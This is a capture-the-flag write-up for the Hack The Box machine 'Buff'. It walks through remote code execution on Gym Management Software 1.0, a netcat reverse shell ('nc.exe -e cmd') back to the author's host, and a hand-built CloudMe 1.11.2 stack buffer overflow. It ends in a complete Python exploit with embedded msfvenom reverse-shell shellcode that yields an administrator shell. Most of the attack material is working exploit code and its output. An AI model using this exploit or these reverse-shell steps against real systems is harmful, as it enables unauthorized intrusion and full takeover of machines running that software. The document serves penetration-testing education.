# Buff
## Enumeration

I start with a nmap scan on all tcp ports of the machine
```bash
$ sudo nmap -sS -p- --open -n -Pn --min-rate=5000 10.10.10.198 -vvv
PORT     STATE SERVICE    REASON
7680/tcp open  pando-pub  syn-ack ttl 127
8080/tcp open  http-proxy syn-ack ttl 127
```

visiting the port 8080 of the machine I find a "gym" website, heading to contact.php I find is a site built with Gym Management Software 1.0

![Desktop View](.gitbook/assets/img/htb/buff/contact_php.png)

## shell as shaun

Searching for exploits I find an unauthenticated remote command execution for  [__gym management system 1.0__](https://www.exploit-db.com/exploits/48506), I clone the script to my machine
```bash
$ searchsploit -m php/webapps/48506.py
```

and I run the script 

```bash
$ ./48506.py http://10.10.10.198:8080/
...<snip>...
[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload>
```

to upgrade the webshell to a normal shell I will download nc on the target machine.

first I start a nc listener 
```bash
$ rlwrap -cAr nc -lvnp 9001
```

I serve nc.exe in a web server through python
```bash
python3 -m http.server 80 
```

on the target machine I use curl to download the executable and run it 
```bash
C:\xampp\htdocs\gym\upload> curl http://10.10.14.13/nc.exe -O 


C:\xampp\htdocs\gym\upload> dir
 Directory of C:\xampp\htdocs\gym\upload

20/08/2024  20:01    <DIR>          .
20/08/2024  20:01    <DIR>          ..
20/08/2024  19:56                53 kamehameha.php
20/08/2024  20:01            28,160 nc.exe
               2 File(s)         28,213 bytes
               2 Dir(s)   7,236,259,840 bytes free

C:\xampp\htdocs\gym\upload> nc.exe -e cmd 10.10.14.13 9001 
```

and I get a shell as shaun
```bash
$ rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.198] 49686
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun
```


### CloudMe buffer overflow

Enumerating the home directory of "shaun" I find a CloudMe_1112.exe file 

```bash
C:\Users\shaun>tree /a /f
tree /a /f
...<snip>...
+---Downloads
|       CloudMe_1112.exe
```

I also find a process listening on port 8888, by  using a oneliner I can identify that is indeed CloudMe running at different intervals of time.

```bash
C:\Users\shaun>netstat -noa
TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       1284

C:\Users\shaun> for /f "tokens=5" %a in ('netstat -ano ^| findstr :8888') do wmic process where processid=%a get Caption,CommandLine

C:\Users\shaun>wmic process where processid=1540 get Caption,CommandLine 
Caption      CommandLine  
CloudMe.exe  
```

> There are various public buffer overflow exploits for cloudme 1.11.2 in the [exploit-db](https://www.exploit-db.com/) database, but for the case of this writeup I'll explain the process of how to create a basic buffer overflow exploit. 

First I'll copy the cloudme executable to my machine, I will do this through a smb share 

1. On my linux machine
```bash
$ impacket-smbserver smbFolder `pwd` -smb2support
```

2. On the target windows machine
```bash
C:\Users\shaun\Downloads>copy CloudMe_1112.exe \\10.10.14.13\smbFolder\
```

Then I import and install the executable and create a direct link to my desktop in a windows 10 virtual machine where I will use [xdbg](https://x64dbg.com/) specifically the 32 bit version x32dbg and with its respective plugin [ERC](https://github.com/Andy53/ERC.Xdbg) to debug the binary.

I also import chisel on the windows_debug machine to expose the port 8888, note that is necessary to disable windows defender in real time to make use of chisel.

1. to expose the internal port first I create a chisel server on my linux machine
```bash
$ ./chisel_1.7.3_linux_amd64 server --reverse --port 1234
```

2. on the windows_debug machine I connect the chisel client to my server

```bash
C:\Users\user\Desktop>chisel_1.7.3_windows_amd64 client 192.168.56.1:1234 R:8888:127.0.0.1:8888
```

To import the file to xdbg I'll do  the following
1. go to File > Open > CloudMe.exe

![Desktop View](.gitbook/assets/img/htb/buff/file_open.png)

2. click repeatedly on the run button until the program starts

![Desktop View](.gitbook/assets/img/htb/buff/run_button.png)

Once the program starts I'll begin to write the exploit script in python.

#### checking for buffer overflow
First I'll send 9999 "A"s to the program to verify a buffer overflow vulnerability.

```python
#!/usr/bin/env python3
from pwn import *

def exploit():
    
    buffer="\x41" * 9999

    payload = buffer

    conn = remote(host,port)
    conn.sendline(payload)
    conn.close()
    print("[+] Payload sent")
    
if __name__ == '__main__':
    exploit()
```

```sh
python exp.py
```

by checking the registers I confirm that it is vulnerable to buffer overflow since eip was overwritten with "A"s

![Desktop View](.gitbook/assets/img/htb/buff/registers_1.png)

Since the program has crashed I'll have to reload it, to do it I 
1. click on the restart button
2. click run button repeatedly until the program starts

![Desktop View](.gitbook/assets/img/htb/buff/buttons.png)

This process will have to be repeated through all the debugging since the program will be crashing many times due to the overflow, it will be referred as __reloading the program in the debugger__.

#### finding the exact length of buffer before EIP

To check what is the length of junk data to send before reaching the eip I send a specially crafted pattern created with the metasploit tool  pattern_create.rb, I save the pattern to a file and with a python script I make it read from the file and send the pattern.

```bash
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 9999 > pattern
```

```python
from pwn import *

def exploit():
    
    with open('./pattern','r') as file:
        buffer=file.read()

    payload = buffer

    conn = remote(host,port)
    conn.sendline(payload)
    conn.close()
    print("[+] Payload sent")
    
if __name__ == '__main__':
    exploit() 
```

I check the registers and copy the value of EIP


![Desktop View](.gitbook/assets/img/htb/buff/registers_2.png)


by quering the pattern I find that the offset is at 1052 bytes
```
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x316A4230
[*] Exact match at offset 1052
````

To prove this I send 1052 "U"s and 4 "f"s, if its correct I'll see 66666666 in the EIP register 

```python
from pwn import *

def exploit():
    
    buffer="\x55" * 1052
    eip="\x66" * 4

    payload = buffer + eip

    conn = remote(host,port)
    conn.sendline(payload)
    conn.close()
    print("[+] Payload sent")
    
if __name__ == '__main__':
    exploit() 
```

Before running the exploit I reload cloudme.exe in the debugger.

After sending the new string I verify that I have control over the EIP and can continue creating the exploit 

![Desktop View](.gitbook/assets/img/htb/buff/registers_3.png)

#### looking for badchars

I'll start searching for badchars that might affect the execution of the shellcode, to do this I will send a bytearray of all the characters from `\x00` to `xff`



```python
from pwn import *

def exploit():
    
    buffer="\x55" * 1052
    eip="\x66" * 4
    
    all_chars=("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    payload = buffer + eip + all_chars

    conn = remote(host,port)
    conn.sendline(payload)
    conn.close()
    print("[+] Payload sent")
    
if __name__ == '__main__':
    exploit() 
    
```

before sending the bytearray I reload the program in the debugger and generate a bytearray with ERC to compare the characters.

To create a bytearray with ERC

1. go to the log tab in xdbg

![Desktop View](.gitbook/assets/img/htb/buff/log_tab.png)

2. on the command prompt at the bottom type `ERC --config setworkingdirectory C:\users\user\desktop\`

![Desktop View](.gitbook/assets/img/htb/buff/command_prompt_1.png)

3. on the command prompt at the bottom type `ERC --bytearray` this will generate two bytearray files in the working directory

![Desktop View](.gitbook/assets/img/htb/buff/files_1.png)

After doing this I'll send the bytearray to the program and will check the characters, the bytearray will be stored in ESP.
To check for the array I can click on "Follow in Dump" to see the bytearray in the registers or in this case copy the value which is the address of ESP and compare it with the bytearray

![Desktop View](.gitbook/assets/img/htb/buff/esp_1.png)

* in the log tab on the command prompt at the bottom I type `ERC --compare 0x00A3AA30 C:\users\user\desktop\bytearray_1.bin`  0x00A3AA30 is the address of ESP that I copied before in "Copy Value" and the bytearray is the one generated before. 

* The result is that there are no bad chars, but just to be sure I'll remove the common bad chars such as `\x00\x0a\x0d\xff`

![Desktop View](.gitbook/assets/img/htb/buff/no_bad_chars.png)

new bytearray
```python

from pwn import *

def exploit():
    
    buffer="\x55" * 1052
    eip="\x66" * 4
    
    all_chars=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe")

    payload = buffer + eip + all_chars

    conn = remote(host,port)
    conn.sendline(payload)
    conn.close()
    print("[+] Payload sent")
    
if __name__ == '__main__':
    exploit()   
```

I create another byte-array omitting those characters in ERC `ERC --bytearray -bytes \x00\x0a\x0d\xff` this will create another two files ByteArray_2.txt and ByteArray_2.bin

![Desktop View](.gitbook/assets/img/htb/buff/erc_1.png)

I reload the program in the debugger, send the new byte-array and compare the characters with ERC
`erc --compare 0x00A3AA30 C:\users\user\desktop\bytearray_2.bin`

everything is correct 

![Desktop View](.gitbook/assets/img/htb/buff/no_bad_chars_2.png)

#### finding a return instruction

I have to find an instruction that does a jmp esp so that instruction will be loaded to the eip register and make it execute the shellcode, to find a valid instruction I'll use `erc --moduleinfo -nxcompat` command to find modules that don't have nxcompat/stack execution enabled and don't have rebase 

![Desktop View](.gitbook/assets/img/htb/buff/moduleinfo_1.png)

There are many modules (83) so I copy the output to a file and filter with grep the "True" string resulting in the following:

```java
$ grep -v "True" modules
------------------------------------------------------------------------------------------------------------------------ 
Process Name: CloudMe Modules total: 83 
------------------------------------------------------------------------------------------------------------------------ 
 Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name and Path 
------------------------------------------------------------------------------------------------------------------------ 
 0x400000        0x14c0          0x431000    False      False      False      False      False      C:\Users\user\Desktop\CloudMe\CloudMe\CloudMe.exe 
 0x68a80000      0x1410          0x5d5000    False      False      False      False      False      5.9.0.0;C:\Users\user\Desktop\CloudMe\CloudMe\Qt5Core.dll 
 0x61b40000      0x1410          0x5f6000    False      False      False      False      False      5.9.0.0;C:\Users\user\Desktop\CloudMe\CloudMe\Qt5Gui.dll 
 0x69900000      0x1410          0x1c1000    False      False      False      False      False      5.9.0.0;C:\Users\user\Desktop\CloudMe\CloudMe\Qt5Network.dll 
 0x6d9c0000      0x1410          0x4c000     False      False      False      False      False      5.9.0.0;C:\Users\user\Desktop\CloudMe\CloudMe\Qt5Sql.dll 
 0x66e00000      0x1410          0x3d000     False      False      False      False      False      5.9.0.0;C:\Users\user\Desktop\CloudMe\CloudMe\Qt5Xml.dll 
 0x6eb40000      0x1410          0x24000     False      False      False      False      False      C:\Users\user\Desktop\CloudMe\CloudMe\libgcc_s_dw2-1.dll 
 0x6fe40000      0x1410          0x17e000    False      False      False      False      False      C:\Users\user\Desktop\CloudMe\CloudMe\libstdc++-6.dll 
 0x64b40000      0x1410          0x1b000     False      False      False      False      False      1,;WinPthreadGC;C:\Users\user\Desktop\CloudMe\CloudMe\libwinpthread-1.dll 
 0x6aa80000      0x1410          0x1b7000    False      False      False      False      False      5.9.0.0;C:\Users\user\Desktop\CloudMe\CloudMe\platforms\qwindows.dll 
 ```

I'll be using the first module, first I go to symbols and click on the selected module
![Desktop View](.gitbook/assets/img/htb/buff/module_1.png)

I right click on the start address and copy the value 

![Desktop View](.gitbook/assets/img/htb/buff/copy_start_address.png)

I click on the References tab

![Desktop View](.gitbook/assets/img/htb/buff/references_tab.png)

On the command prompt I type `findall 00401000,ffe4` looking for a jmp esp address in its hexadecimal form which is FF E4

![Desktop View](.gitbook/assets/img/htb/buff/findall_1.png)

and I can use any of these instructions 


![Desktop View](.gitbook/assets/img/htb/buff/instructions_1.png)


I add those instructions to the script in the eip variable.

```python
from pwn import *

context(arch="i386",os="linux")

def exploit():
    
    buffer = b"\x55" * 1052
    
    eip = p32(0x0040D7ED)
    
    payload = buffer + eip

    conn = remote(host,port)
    conn.sendline(payload)
    conn.close()
    print("[+] Payload sent")
    
if __name__ == '__main__':
    exploit()    

```


#### creating shellcode

I create a shellcode with msfvenom removing the badchars and configured to connect to my vboxnet0 interface ip (192.168.56.1) which is where I am debugging.

``` bash
$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.1 lport=9001 -b "\x00\x0a\x0d\xff" -f py -v shellcode EXITFUNC=thread
```

I add the generated shellcode to my exploit and add some nops to it so the program will have time to execute the shellcode
```python
from pwn import *

context(arch="i386",os="linux")

def exploit():
    
    buffer = b"\x55" * 1052
    eip = p32(0x0040D7ED)
    
    nops = b"\x90" * 32

    shellcode =  b""
    shellcode += b"\xdb\xdf\xd9\x74\x24\xf4\xba\x4e\x4a\x17\xbe"
    shellcode += b"\x58\x31\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04"
    shellcode += b"\x03\x1e\x59\xf5\x4b\x62\xb5\x7b\xb3\x9a\x46"
    shellcode += b"\x1c\x3d\x7f\x77\x1c\x59\xf4\x28\xac\x29\x58"
    shellcode += b"\xc5\x47\x7f\x48\x5e\x25\xa8\x7f\xd7\x80\x8e"
    shellcode += b"\x4e\xe8\xb9\xf3\xd1\x6a\xc0\x27\x31\x52\x0b"
    shellcode += b"\x3a\x30\x93\x76\xb7\x60\x4c\xfc\x6a\x94\xf9"
    shellcode += b"\x48\xb7\x1f\xb1\x5d\xbf\xfc\x02\x5f\xee\x53"
    shellcode += b"\x18\x06\x30\x52\xcd\x32\x79\x4c\x12\x7e\x33"
    shellcode += b"\xe7\xe0\xf4\xc2\x21\x39\xf4\x69\x0c\xf5\x07"
    shellcode += b"\x73\x49\x32\xf8\x06\xa3\x40\x85\x10\x70\x3a"
    shellcode += b"\x51\x94\x62\x9c\x12\x0e\x4e\x1c\xf6\xc9\x05"
    shellcode += b"\x12\xb3\x9e\x41\x37\x42\x72\xfa\x43\xcf\x75"
    shellcode += b"\x2c\xc2\x8b\x51\xe8\x8e\x48\xfb\xa9\x6a\x3e"
    shellcode += b"\x04\xa9\xd4\x9f\xa0\xa2\xf9\xf4\xd8\xe9\x95"
    shellcode += b"\x39\xd1\x11\x66\x56\x62\x62\x54\xf9\xd8\xec"
    shellcode += b"\xd4\x72\xc7\xeb\x1b\xa9\xbf\x63\xe2\x52\xc0"
    shellcode += b"\xaa\x21\x06\x90\xc4\x80\x27\x7b\x14\x2c\xf2"
    shellcode += b"\x2c\x44\x82\xad\x8c\x34\x62\x1e\x65\x5e\x6d"
    shellcode += b"\x41\x95\x61\xa7\xea\x3c\x98\x20\xd5\x69\x9a"
    shellcode += b"\xb1\xbd\x6b\xda\x92\x14\xe5\x3c\xbe\x76\xa3"
    shellcode += b"\x97\x57\xee\xee\x63\xc9\xef\x24\x0e\xc9\x64"
    shellcode += b"\xcb\xef\x84\x8c\xa6\xe3\x71\x7d\xfd\x59\xd7"
    shellcode += b"\x82\x2b\xf5\xbb\x11\xb0\x05\xb5\x09\x6f\x52"
    shellcode += b"\x92\xfc\x66\x36\x0e\xa6\xd0\x24\xd3\x3e\x1a"
    shellcode += b"\xec\x08\x83\xa5\xed\xdd\xbf\x81\xfd\x1b\x3f"
    shellcode += b"\x8e\xa9\xf3\x16\x58\x07\xb2\xc0\x2a\xf1\x6c"
    shellcode += b"\xbe\xe4\x95\xe9\x8c\x36\xe3\xf5\xd8\xc0\x0b"
    shellcode += b"\x47\xb5\x94\x34\x68\x51\x11\x4d\x94\xc1\xde"
    shellcode += b"\x84\x1c\xe1\x3c\x0c\x69\x8a\x98\xc5\xd0\xd7"
    shellcode += b"\x1a\x30\x16\xee\x98\xb0\xe7\x15\x80\xb1\xe2"
    shellcode += b"\x52\x06\x2a\x9f\xcb\xe3\x4c\x0c\xeb\x21"

    payload = buffer + eip + all_chars

    conn = remote(host,port)
    conn.sendline(payload)
    conn.close()
    print("[+] Payload sent")
    
if __name__ == '__main__':
    exploit()    
```

#### testing exploit locally 

I start a nc listener and run the exploit successfully receiving a connection 

```bash
$ python exp.py
[+] Opening connection to 127.0.0.1 on port 8888: Done
[*] Closed connection to 127.0.0.1 port 8888
[+] Payload sent
```

```bash
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.146] 56576
Microsoft Windows [Versi�n 10.0.19045.4529]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop\CloudMe\CloudMe>
```

## shell as administrator

I will do the same procedure, first I will copy chisel in the target machine 

```shell
C:\Windows\Temp\x>copy \\10.10.14.13\smbFolder\chisel_1.7.3_windows_amd64 . 
copy \\10.10.14.13\smbFolder\chisel_1.7.3_windows_amd64 . 
        1 file(s) copied.
```

I close the previous chisel client connection I had from the windows_debug machine and connect the target machine to my server

```shell
C:\Windows\Temp\x>chisel_1.7.3_windows_amd64 client 10.10.14.13:1234 R:8888:127.0.0.1:8888 
chisel_1.7.3_windows_amd64 client 10.10.14.13:1234 R:8888:127.0.0.1:8888 
2024/08/20 23:09:44 client: Connecting to ws://10.10.14.13:1234
2024/08/20 23:09:45 client: Connected (Latency 107.6835ms)
```

I generate a new shellcode with my updated ip address of the tun0 interface

```
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -b "\x00\x0a\x0d\xff" -f py -v shellcode EXITFUNC=thread
```

final exploit

```python
#!/usr/bin/env python3

from pwn import *

context(arch="i386",os="linux")

def exploit():
    host = "127.0.0.1" #change this
    port = 8888 #change this
    
    buffer = b"\x55" * 1052
#    with open('./pattern','r') as file:
#        buffer=file.read()
    #eip
    eip = p32(0x0051e583)
    
    #nops
    nops = b"\x90" * 32

    #shellcode
    # msfvenom -p windows/shell_reverse_tcp lhost=IP_LHOST lport=PORT -b "\x00\x0a\x0d\xff" -f py -v shellcode EXITFUNC=thread
    shellcode =  b""
    shellcode += b"\xdb\xce\xd9\x74\x24\xf4\xbb\xb9\x46\xc1\xe7"
    shellcode += b"\x5a\x31\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x13"
    shellcode += b"\x03\xe3\x55\x23\x12\xef\xb2\x21\xdd\x0f\x43"
    shellcode += b"\x46\x57\xea\x72\x46\x03\x7f\x24\x76\x47\x2d"
    shellcode += b"\xc9\xfd\x05\xc5\x5a\x73\x82\xea\xeb\x3e\xf4"
    shellcode += b"\xc5\xec\x13\xc4\x44\x6f\x6e\x19\xa6\x4e\xa1"
    shellcode += b"\x6c\xa7\x97\xdc\x9d\xf5\x40\xaa\x30\xe9\xe5"
    shellcode += b"\xe6\x88\x82\xb6\xe7\x88\x77\x0e\x09\xb8\x26"
    shellcode += b"\x04\x50\x1a\xc9\xc9\xe8\x13\xd1\x0e\xd4\xea"
    shellcode += b"\x6a\xe4\xa2\xec\xba\x34\x4a\x42\x83\xf8\xb9"
    shellcode += b"\x9a\xc4\x3f\x22\xe9\x3c\x3c\xdf\xea\xfb\x3e"
    shellcode += b"\x3b\x7e\x1f\x98\xc8\xd8\xfb\x18\x1c\xbe\x88"
    shellcode += b"\x17\xe9\xb4\xd6\x3b\xec\x19\x6d\x47\x65\x9c"
    shellcode += b"\xa1\xc1\x3d\xbb\x65\x89\xe6\xa2\x3c\x77\x48"
    shellcode += b"\xda\x5e\xd8\x35\x7e\x15\xf5\x22\xf3\x74\x92"
    shellcode += b"\x87\x3e\x86\x62\x80\x49\xf5\x50\x0f\xe2\x91"
    shellcode += b"\xd8\xd8\x2c\x66\x1e\xf3\x89\xf8\xe1\xfc\xe9"
    shellcode += b"\xd1\x25\xa8\xb9\x49\x8f\xd1\x51\x89\x30\x04"
    shellcode += b"\xf5\xd9\x9e\xf7\xb6\x89\x5e\xa8\x5e\xc3\x50"
    shellcode += b"\x97\x7f\xec\xba\xb0\xea\x17\x2d\xb5\xe0\x19"
    shellcode += b"\xa0\xa1\xf6\x25\x99\x18\x7e\xc3\xb7\x4a\xd6"
    shellcode += b"\x5c\x20\xf2\x73\x16\xd1\xfb\xa9\x53\xd1\x70"
    shellcode += b"\x5e\xa4\x9c\x70\x2b\xb6\x49\x71\x66\xe4\xdc"
    shellcode += b"\x8e\x5c\x80\x83\x1d\x3b\x50\xcd\x3d\x94\x07"
    shellcode += b"\x9a\xf0\xed\xcd\x36\xaa\x47\xf3\xca\x2a\xaf"
    shellcode += b"\xb7\x10\x8f\x2e\x36\xd4\xab\x14\x28\x20\x33"
    shellcode += b"\x11\x1c\xfc\x62\xcf\xca\xba\xdc\xa1\xa4\x14"
    shellcode += b"\xb2\x6b\x20\xe0\xf8\xab\x36\xed\xd4\x5d\xd6"
    shellcode += b"\x5c\x81\x1b\xe9\x51\x45\xac\x92\x8f\xf5\x53"
    shellcode += b"\x49\x14\x15\xb6\x5b\x61\xbe\x6f\x0e\xc8\xa3"
    shellcode += b"\x8f\xe5\x0f\xda\x13\x0f\xf0\x19\x0b\x7a\xf5"
    shellcode += b"\x66\x8b\x97\x87\xf7\x7e\x97\x34\xf7\xaa"
        
    payload = buffer + eip + nops + shellcode
    #prompt=">> "
    conn = remote(host,port)
    #conn.recvuntil(prompt)
    conn.sendline(payload)
    conn.close()
    print("[+] Payload sent")
    
if __name__ == '__main__':
    exploit()      
```

finally I receive a shell as administrator

```shell
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.198] 49704
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator

C:\Windows\system32>
```
